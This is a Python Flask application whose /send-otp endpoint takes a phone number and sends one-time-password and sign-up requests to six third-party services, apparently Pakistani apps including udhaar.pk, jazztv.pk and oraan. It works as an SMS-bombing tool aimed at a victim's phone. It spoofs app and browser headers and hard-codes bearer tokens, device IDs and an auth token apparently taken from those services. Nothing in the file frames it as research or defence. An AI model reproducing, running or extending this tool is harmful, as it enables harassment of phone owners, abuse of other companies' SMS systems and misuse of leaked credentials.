from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import time
import logging

app = Flask(__name__)
CORS(app)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    data = request.json
    phone_number = data.get('phone_number')
    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400

    logger.info(f"Received request to send OTP to {phone_number}")

    responses = []

    def execute_api_request(api_name, function):
        try:
            response = function()
            logger.info(f"{api_name} response: {response.status_code} - {response.text}")
            responses.append({
                "api_name": api_name,
                "status_code": response.status_code,
                "response": response.json() if response.content else {"error": "Empty response"}
            })
        except Exception as e:
            logger.error(f"An error occurred with {api_name}: {str(e)}")
            responses.append({
                "api_name": api_name,
                "error": str(e)
            })

    # First API request
    def api_1():
        url1 = "https://web.udhaar.pk/udhaar/dukaan/create/sendotp/"
        headers1 = {
            "Host": "web.udhaar.pk",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": "https://web.udhaar.pk",
            "Referer": "https://web.udhaar.pk/SignUp",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Type": "application/json; charset=UTF-8"
        }
        payload1 = {
            "phone_number": phone_number,
            "referer": None,
            "version": "multi-business"
        }
        return requests.post(url1, headers=headers1, json=payload1)

    # Second API request
    def api_2():
        url2 = "https://staging.cricwick.net:13002/api/send_pin"
        params2 = {
            "telco": "easypaisa",
            "phone": phone_number,
            "sub_type": "",
            "source": 2,
            "sub_source": "CricwickWeb",
            "is_bundle": 1,
            "bundle_id": 13
        }
        return requests.get(url2, params=params2)

    # Third API request
    def api_3():
        url3 = "https://jazztv.pk/alpha/api_gateway/index.php/users-dbss/send-otp-wc"
        headers3 = {
            "authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvYXV0aFwvbG9naW4iLCJpYXQiOjE3MjA3NzcwMjEsImV4cCI6MTcyMTM3NzAyMSwibmJmIjoxNzIwNzc3MDIxLCJqdGkiOiJvUlpwRnFlSkllZ0NRWU1hIiwic3ViIjo2LCJwcnYiOiI4N2UwYWYxZWY5ZmQxNTgxMmZkZWM5NzE1M2ExNGUwYjA0NzU0NmFhIn0.0EyymdeXeSGI2bI38IBr-YMvH_Stnm1v2ISQ0GVJchs",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.10.0"
        }
        data1 = {
            "other_telco": "telenor",
            "device_id": "3acc1d874d4538ef",
            "user_id": "58832432",
            "telco": "other",
            "is_jazz_user": "no",
            "mobile": phone_number,
            "type": "prepaid"
        }
        return requests.post(url3, headers=headers3, data=data1)

    # Fourth API request
    def api_4():
        url4 = "https://portallapp.com/api/v1/auth/generate-otp"
        payload4 = {
            "mobile_no": phone_number[-10:]  # Extract the last 10 digits for mobile_no
        }
        return requests.post(url4, json=payload4)

    # Fifth API request
    def api_5():
        url5 = "https://jazztv.pk/alpha/api_gateway/index.php/v2/users-dbss/sign-up-wc"
        headers5 = {
            "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvaW5kZXgucGhwXC9hdXRoXC9sb2dpbiIsImlhdCI6MTcyNDY4NDA4NSwiZXhwIjoxNzI1Mjg0MDg1LCJuYmYiOjE3MjQ2ODQwODUsImp0aSI6IjFxVDl0U1NqQ3FZUDNOeVIiLCJzdWIiOjYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.WQJtyziTZJ8CB89H2tm2V16CRu_VLrC1iBkCUqnQwqk",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/3.10.0"
        }
        data5 = {
            "device": "android",
            "utm_medium": "",
            "from_screen": "packages1",
            "is_header_enrichment": "no",
            "phone_details": "ONEPLUS LE2121 (7.1.2) - App-Version(30125)",
            "mobile": phone_number,
            "url": "",
            "other_telco": "jazz",
            "utm_medium_fb": "",
            "utm_campaign_fb": "",
            "telco": "jazz",
            "device_id": "85c5f237104aafd1",
            "ip": "",
            "utm_source": "",
            "utm_source_fb": "",
            "utm_campaign": ""
        }
        return requests.post(url5, headers=headers5, data=data5)

    # Sixth API request
    def api_6():
        url6 = "https://baseapi.oraan.com/api/users/send-otp"
        auth_token = "0147C481BF6D516739336659C7CE1FDA528FEFE691DF130C0D4731EFCA06B14DE10B3166BCF76E8BC07AA08C0A344E2924DBC282387949D72B7DB773DD7BF4A7"
        headers6 = {
            "user-agent": "Dart/2.19 (dart:io)",
            "auth_token": auth_token,
            "accept-encoding": "gzip",
        }
        data6 = {
            "phone": f"+92{phone_number[-10:]}",  # Convert to +92 format for this API
            "whatsapp": "false"
        }
        return requests.post(url6, headers=headers6, data=data6)

    # Execute all API requests independently
    execute_api_request("API 1", api_1)
    execute_api_request("API 2", api_2)
    execute_api_request("API 3", api_3)
    execute_api_request("API 4", api_4)
    execute_api_request("API 5", api_5)
    execute_api_request("API 6", api_6)

    return jsonify({"success": True, "message": "OTP requests processed", "responses": responses}), 200

if __name__ == '__main__':
    app.run(debug=True)
